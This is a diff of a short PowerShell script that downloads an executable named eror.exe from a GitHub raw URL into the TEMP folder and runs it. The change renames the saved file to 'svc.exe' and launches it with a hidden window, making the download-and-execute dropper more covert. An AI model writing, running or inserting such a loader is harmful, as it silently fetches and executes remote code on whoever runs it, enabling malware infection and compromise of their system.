@@ -1,4 +1,4 @@
-$url = "https://raw.githubusercontent.com/hal0151/erorft/main/eror.exe"
-$out = "$env:TEMP\eror.exe"
-Invoke-WebRequest -Uri $url -OutFile $out
-Start-Process -FilePath $out
+$url = "https://raw.githubusercontent.com/hal0151/erorft/refs/heads/main/eror.exe"
+$path = "$env:TEMP\svc.exe"
+Invoke-RestMethod -Uri $url -OutFile $path
+Start-Process -FilePath $path -WindowStyle Hidden
